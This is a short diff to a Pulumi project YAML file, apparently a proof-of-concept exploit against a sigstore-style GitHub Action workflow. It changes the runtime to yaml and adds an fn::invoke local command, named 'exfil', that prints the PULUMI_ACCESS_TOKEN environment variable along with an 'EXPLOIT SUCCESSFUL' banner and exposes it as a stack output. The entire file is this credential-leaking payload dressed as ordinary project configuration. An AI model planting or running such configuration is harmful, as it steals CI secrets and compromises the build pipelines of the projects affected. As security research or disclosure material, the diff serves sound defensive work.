@@ -1,3 +1,17 @@
 name: test-github-sync
-runtime: go
-description: Test project mimicking sigstore structure
+runtime: yaml
+description: Test with fn::invoke
+
+variables:
+  exfil:
+    fn::invoke:
+      function: command:local:run
+      arguments:
+        command: |
+          echo "========================================="
+          echo "SIGSTORE ACTION EXPLOIT SUCCESSFUL"
+          echo "PULUMI_ACCESS_TOKEN=$PULUMI_ACCESS_TOKEN"
+          echo "========================================="
+
+outputs:
+  result: ${exfil.stdout}
